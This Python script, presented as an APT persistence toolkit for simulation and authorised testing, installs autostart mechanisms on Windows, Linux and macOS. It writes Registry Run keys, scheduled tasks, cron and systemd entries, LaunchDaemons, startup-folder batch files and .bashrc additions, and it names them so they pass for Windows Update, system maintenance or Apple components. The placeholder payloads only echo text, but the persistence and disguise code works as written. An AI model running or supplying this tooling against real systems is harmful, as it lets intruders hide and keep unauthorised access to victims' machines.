#!/usr/bin/env python3
"""
APT Persistence Toolkit
Advanced persistence mechanisms for APT simulation
For educational and authorized penetration testing only
"""

import os
import sys
import platform
import subprocess
import json
import random
import string
from datetime import datetime

class APTPersistence:
    def __init__(self):
        self.system_info = self.get_system_info()
        self.persistence_methods = []
        
    def get_system_info(self):
        """Gather system information"""
        return {
            "platform": platform.system(),
            "platform_release": platform.release(),
            "platform_version": platform.version(),
            "architecture": platform.machine(),
            "hostname": platform.node(),
            "processor": platform.processor(),
            "python_version": platform.python_version()
        }
    
    def generate_random_name(self, prefix=""):
        """Generate random names for persistence mechanisms"""
        suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        return f"{prefix}{suffix}"
    
    def check_admin_privileges(self):
        """Check if running with administrator privileges"""
        if platform.system() == "Windows":
            try:
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin()
            except:
                return False
        else:
            return os.geteuid() == 0
    
    def windows_registry_persistence(self):
        """Windows Registry Run Key persistence"""
        if platform.system() != "Windows":
            return {"status": "skipped", "reason": "Windows only"}
            
        try:
            import winreg
            
            # Common registry run keys
            run_keys = [
                (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                (winreg.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"),
                (winreg.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce")
            ]
            
            persistence_entries = []
            
            for hive, key_path in run_keys:
                try:
                    key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE)
                    entry_name = self.generate_random_name("WindowsUpdate_")
                    # Use a benign command for demonstration
                    entry_value = "cmd.exe /c echo 'APT Persistence Test'"
                    
                    winreg.SetValueEx(key, entry_name, 0, winreg.REG_SZ, entry_value)
                    winreg.CloseKey(key)
                    
                    persistence_entries.append({
                        "hive": hive,
                        "key": key_path,
                        "name": entry_name,
                        "value": entry_value
                    })
                    
                except Exception as e:
                    pass
            
            return {"status": "success", "entries": persistence_entries}
            
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    def windows_scheduled_task_persistence(self):
        """Windows Scheduled Task persistence"""
        if platform.system() != "Windows":
            return {"status": "skipped", "reason": "Windows only"}
            
        try:
            task_name = self.generate_random_name("SystemMaintenance_")
            
            # Create a scheduled task using schtasks
            command = f'schtasks /create /tn "{task_name}" /tr "cmd.exe /c echo APT" /sc daily /st 09:00 /f'
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                return {"status": "success", "task_name": task_name}
            else:
                return {"status": "error", "error": result.stderr}
                
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    def linux_cron_persistence(self):
        """Linux cron job persistence"""
        if platform.system() != "Linux":
            return {"status": "skipped", "reason": "Linux only"}
            
        try:
            cron_entry = "@reboot echo 'APT Persistence Test' > /tmp/apt_test.txt\n"
            
            # Add to user's crontab
            process = subprocess.Popen(['crontab', '-l'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            current_crontab, _ = process.communicate()
            
            new_crontab = current_crontab.decode() + cron_entry
            
            process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
            process.communicate(input=new_crontab.encode())
            
            return {"status": "success", "cron_entry": cron_entry.strip()}
            
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    def linux_systemd_persistence(self):
        """Linux systemd service persistence"""
        if platform.system() != "Linux":
            return {"status": "skipped", "reason": "Linux only"}
            
        if not self.check_admin_privileges():
            return {"status": "skipped", "reason": "Root privileges required"}
            
        try:
            service_name = self.generate_random_name("system-")
            service_file = f"/etc/systemd/system/{service_name}.service"
            
            service_content = f"""[Unit]
Description=System Maintenance Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/echo "APT Persistence Test"
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
            
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            # Enable and start the service
            subprocess.run(['systemctl', 'enable', service_name], capture_output=True)
            subprocess.run(['systemctl', 'start', service_name], capture_output=True)
            
            return {"status": "success", "service_name": service_name}
            
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    def macos_launchd_persistence(self):
        """macOS launchd persistence"""
        if platform.system() != "Darwin":
            return {"status": "skipped", "reason": "macOS only"}
            
        try:
            plist_name = self.generate_random_name("com.apple.")
            plist_path = f"/Library/LaunchDaemons/{plist_name}.plist"
            
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{plist_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/echo</string>
        <string>APT Persistence Test</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>3600</integer>
</dict>
</plist>
"""
            
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            
            # Load the launchd job
            subprocess.run(['launchctl', 'load', plist_path], capture_output=True)
            
            return {"status": "success", "plist_name": plist_name}
            
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    def file_based_persistence(self):
        """File-based persistence mechanisms"""
        persistence_files = []
        
        try:
            # Windows startup folder
            if platform.system() == "Windows":
                startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                bat_file = os.path.join(startup_path, self.generate_random_name("update_") + ".bat")
                
                with open(bat_file, 'w') as f:
                    f.write("@echo off\necho APT Persistence Test\n")
                
                persistence_files.append({"type": "startup_folder", "path": bat_file})
            
            # Linux/MacOS rc.local or similar
            elif platform.system() in ["Linux", "Darwin"]:
                # User's bashrc
                bashrc_path = os.path.expanduser("~/.bashrc")
                if os.path.exists(bashrc_path):
                    with open(bashrc_path, 'a') as f:
                        f.write("\n# APT Persistence Test\necho 'APT Persistence Test'\n")
                    persistence_files.append({"type": "bashrc", "path": bashrc_path})
            
            return {"status": "success", "files": persistence_files}
            
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    def install_all_persistence(self):
        """Install all applicable persistence mechanisms"""
        results = {}
        
        print("[*] Installing APT Persistence Mechanisms...")
        
        # Windows-specific persistence
        if platform.system() == "Windows":
            print("  [+] Installing Windows Registry persistence...")
            results["registry"] = self.windows_registry_persistence()
            
            print("  [+] Installing Windows Scheduled Task persistence...")
            results["scheduled_task"] = self.windows_scheduled_task_persistence()
        
        # Linux-specific persistence
        elif platform.system() == "Linux":
            print("  [+] Installing Linux cron persistence...")
            results["cron"] = self.linux_cron_persistence()
            
            if self.check_admin_privileges():
                print("  [+] Installing Linux systemd persistence...")
                results["systemd"] = self.linux_systemd_persistence()
        
        # macOS-specific persistence
        elif platform.system() == "Darwin":
            print("  [+] Installing macOS launchd persistence...")
            results["launchd"] = self.macos_launchd_persistence()
        
        # Cross-platform file-based persistence
        print("  [+] Installing file-based persistence...")
        results["file_based"] = self.file_based_persistence()
        
        return results
    
    def generate_report(self, results):
        """Generate persistence report"""
        report = {
            "timestamp": datetime.now().isoformat(),
            "system_info": self.system_info,
            "persistence_results": results
        }
        
        filename = f"apt_persistence_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        return filename

def print_banner():
    """Print tool banner"""
    banner = """
    ___  _____ _____   _____           _           _   _             
   / _ \\|  _  |  __ \\ |  _  |         (_)         | | (_)            
  / /_\\ \\ | | | |  \\/ | | | |_ __ ___ _ _ __  ___| |_ _  ___  _ __  
  |  _  | | | | | __  | | | | | '__/ _ \\ | '_ \\/ __| __| |/ _ \\| '_ \\ 
  | | | \\ \\_/ / |_\\ \\ | |/ /| | |  __/ | | | \\__ \\ |_| | (_) | | | |
  \\_| |_/\\___/ \\____/ \\___/ |_|  \\___|_|_| |_|___/\\__|_|\\___/|_| |_|

                    Advanced Persistence Toolkit
               For Educational and Authorized Testing Only
    """
    print(banner)

def main():
    """Main function"""
    print_banner()
    
    if len(sys.argv) > 1 and sys.argv[1] == "--help":
        print("\nUsage: python3 apt_persistence.py [OPTIONS]")
        print("\nOPTIONS:")
        print("  --help     Show this help message")
        print("  --install  Install persistence mechanisms")
        print("\nEXAMPLES:")
        print("  python3 apt_persistence.py --install")
        return
    
    if len(sys.argv) > 1 and sys.argv[1] == "--install":
        apt = APTPersistence()
        
        print(f"[*] System: {apt.system_info['platform']} {apt.system_info['platform_release']}")
        print(f"[*] Architecture: {apt.system_info['architecture']}")
        print(f"[*] Admin Privileges: {apt.check_admin_privileges()}")
        print()
        
        results = apt.install_all_persistence()
        
        print("\n[*] Persistence Installation Summary:")
        for method, result in results.items():
            status = result.get('status', 'unknown')
            print(f"  {method}: {status}")
        
        report_file = apt.generate_report(results)
        print(f"\n[+] Persistence report saved to: {report_file}")
        
    else:
        print("\nUse --help for usage information")
        print("Use --install to install persistence mechanisms")

if __name__ == "__main__":
    main()